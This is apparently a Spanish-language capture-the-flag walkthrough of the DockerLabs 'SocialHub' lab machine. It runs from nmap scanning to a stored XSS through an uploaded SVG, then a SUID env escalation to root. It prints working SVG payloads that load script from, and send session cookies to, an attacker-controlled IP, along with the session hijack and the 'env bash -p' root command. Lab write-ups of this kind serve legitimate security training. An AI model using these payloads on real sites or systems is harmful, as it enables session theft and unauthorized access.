![Screenshot](/hard/SocialHub/Images/machine.png)

Dificultad: **dificil**

Hecho por: **El pinguino de mario**

# Pasos para pwnear 🥽

* 👁️  [Reconocimiento](#reconocimiento)
* 🪓 [Explotación](#exploitación)
* 🚩 [Escalación de privilegios](#escalación-de-privilegios)

---

Primero aseguramos que la máquina esté encendida, podemos hacerlo con el comando **ping**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil/socialhub]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.280 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.291 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.092 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2017ms
rtt min/avg/max/mdev = 0.092/0.221/0.291/0.091 ms
```

Ahora podemos comenzar la fase de **reconocimiento**.

---
# Reconocimiento

Comenzamos nuestro reconocimiento con **nmap**, para conocer qué puertos están abiertos en el objetivo.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 17:26 -05
Initiating ARP Ping Scan at 17:26
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 17:26, 0.21s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:26
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 5000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 17:26, 3.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000024s latency).
Scanned at 2025-12-02 17:26:19 -05 for 4s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.18 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le decimos a nmap que escanee todos los puertos, desde el puerto 1 hasta el puerto 65,535.

**-n** <- Con este argumento nmap saltará la resolución DNS, esto es porque a veces en nuestros escaneos esto puede ser muy lento en algunos casos.

**-sS** <- Con este argumento nmap hará un escaneo en modo stealth, esto significa que no se completará el 3-way-handshake, y también hará el escaneo ligeramente más rápido.

**--min-rate 5000** <- Con este argumento nmap enviará al menos 5000 paquetes por segundo, haciendo el escaneo aún más rápido.

**-Pn** <- Con este argumento nmap también saltará la fase de descubrimiento del host, esto significa que nmap tratará la máquina como activa y hará el escaneo inmediatamente.

**-vv** <- Con este argumento nmap nos mostrará los puertos abiertos descubiertos mientras el escaneo continúa, esto significa que si nmap descubre un puerto abierto inmediatamente, nos lo reportará mientras el escaneo continúa.

**--open** <- Con este argumento le estamos diciendo a nmap que solo filtre los puertos abiertos.

Una vez que el escaneo concluye podemos ver 2 puertos abiertos:

- puerto 22 (ssh / secure shell)
- puerto 5000 *(upnp?)*

Podemos hacer otro escaneo con **nmap** para conocer más sobre estos 2 puertos.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/enumeration]
└─$ nmap -p22,5000 -sCV 172.17.0.2 -oX target --stats-every=1m
```

**-p22,5000** <- Con este argumento nmap solo escaneará estos 2 puertos que descubrimos.

**-sCV** <- Con este argumento nmap escaneará la versión de cada puerto para encontrar posibles vulnerabilidades en sistemas no actualizados, y también hará un escaneo con algunos scripts que ejecutan nmap, para encontrar más sobre estos puertos.

**-oX target** <- Con este argumento guardamos toda la salida que nmap nos da y la guardamos como un archivo xml.

**--stats-every=1m** <- Con este argumento recibimos estadísticas del escaneo cada 1 minuto, esto puede tener minutos (m) y segundos (s).

Después de que el escaneo termine obtenemos la salida en un archivo xml, lo hacemos así para poder crear una página html para ver la información de manera más fácil y bonita.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/enumeration]
└─$ xsltproc target -o target.html
```

Con este comando convertimos el archivo xml a un archivo html, ahora abriémoslo.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/enumeration]
└─$ open target.html 
```

Y podemos ver esto:

![Screenshot](/hard/SocialHub/Images/image1.png)

Como podemos ver aquí es más bonito y también más legible.

Y tenemos que el puerto 5000 es un sitio web, veamoslo con nuestro navegador.

![Screenshot](/hard/SocialHub/Images/image2.png)

Podemos ver esto, y también una pista de que este sitio web es vulnerable a **stored XSS** a través de un archivo **SVG**.

Pero primero hagamos una cuenta.

![Screenshot](/hard/SocialHub/Images/image3.png)

Podemos ver cuando nos logueamos, nos muestra otra pista, parece que el usuario **admin** en un momento revisa nuestro perfil. Entonces necesitamos subir un archivo SVG con un script XSS dentro de él.

Entonces cambiemos nuestra imagen de perfil, para subir un archivo SVG.

![Screenshot](/hard/SocialHub/Images/image4.png)

Okay ahora es obvio que podemos subir este tipo de archivo, primero haré un script que muestre una ventana de alerta.

```html
<svg>
<body xmlns="http://www.w3.org/1999/xhtml">
<script>
alert("funny :3")
</script>
</body>  
</svg>
```

Okay así cuando lo subimos podemos ver una ventana de alerta en el sitio web.

![Screenshot](/hard/SocialHub/Images/image5.png)

Y tenemos una explotación para hacer algún **robo de cookies** al admin, aprovechando que el admin revise nuestro perfil.

---
# Explotación

Pero primero asegurémonos de que el usuario admin puede realmente ver nuestro perfil, modifiquemos nuestro archivo SVG.

```html
<svg>
<body xmlns="http://www.w3.org/1999/xhtml">
<script src="http://192.168.0.20/pwned.js">
</script>
</body>  
</svg>
```

Cuando cualquier usuario vea nuestro perfil, automáticamente recibiremos una solicitud GET a nuestra máquina de atacante. Veamos si funciona.

Pero primero hagamos un servidor python para recibir cualquier solicitud a nosotros.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/exploits]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Okay así ahora subamos nuestro archivo SVG.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/exploits]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.0.20 - - [02/Dec/2025 17:55:08] code 404, message File not found
192.168.0.20 - - [02/Dec/2025 17:55:08] "GET /pwned.js HTTP/1.1" 404 -
172.17.0.2 - - [02/Dec/2025 17:55:26] code 404, message File not found
172.17.0.2 - - [02/Dec/2025 17:55:26] "GET /pwned.js HTTP/1.1" 404 -
```

Y el usuario admin puede ver nuestro perfil! La IP de la máquina objetivo es **172.17.0.2** así que ahora podemos robar la cookie del usuario admin.

Entonces cambiamos una vez más nuestro archivo SVG.

```html
<svg>
<body xmlns="http://www.w3.org/1999/xhtml">
<script>
const request = new XMLHttpRequest()
request.open("GET", "http://192.168.0.20/?cookie=" + document.cookie, false)
request.send()
</script>
</body>
</svg>
```

Así con este payload, haremos una solicitud HTTP a nuestra máquina de atacante, y enviaremos la cookie del usuario que esté viendo nuestro perfil.

Así que una vez más encendamos nuestro servidor.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/exploits]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Ahora subamos nuestro inocente archivo SVG :)

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/exploits]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.0.20 - - [02/Dec/2025 18:05:52] "GET /?cookie=session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6ImNyYWZ0In0.aS9wzw.R1m-YlISpyQMqiXj9vF5TyTik3E HTTP/1.1" 200 -
172.17.0.2 - - [02/Dec/2025 18:06:02] "GET /?cookie=session=[REDACTED] HTTP/1.1" 200 -
```

Así que conseguimos nuestra propia cookie, ¡pero también la del usuario admin!

Okay así que copiemos la cookie del usuario admin y la cambiemos por la nuestra.

![Screenshot](/hard/SocialHub/Images/image6.png)

Así que una vez que la cambiamos y recargamos el sitio web y podemos ser el usuario admin!

![Screenshot](/hard/SocialHub/Images/image7.png)

Así que conseguimos las credenciales para iniciar sesión con ssh!

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/exploits]
└─$ ssh hijacking@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:OgRuemYuNpIReVs1Znz61rFzVgvIlRlziYOz6TNRRcU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
hijacking@172.17.0.2's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.16.8+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

hijacking@8eae3778d9c7:~$
```

---
# Escalación de privilegios

Podemos ver si existen algun permiso SUID en el sistema

```
hijacking@8eae3778d9c7:~$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/env
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/sudo
```

Podemos ver aquí que el comando **env** tiene un permiso **SUID**, esto significa que podemos escalar nuestros privilegios!

¿Qué es el comando **env?**, En resumen podemos ejecutar cualquier comando en el sistema, y el propietario del comando **env** es el usuario **root**.

```
hijacking@8eae3778d9c7:~$ /usr/bin/env bash -p
```

Con este comando estamos ejecutando una **bash con privilegios**, esto significa que lanzaremos una nueva shell como el propietario del comando **bash** (**root**)

```
hijacking@8eae3778d9c7:~$ /usr/bin/env bash -p
bash-5.1# cat /root/root.txt 
🚩 ¡FELICIDADES! Has completado el laboratorio y eres ROOT.
Flag: {SUID_ENV_PRIVESC_SUCCESS}
```

Ahora somos root ***...pwned..!***
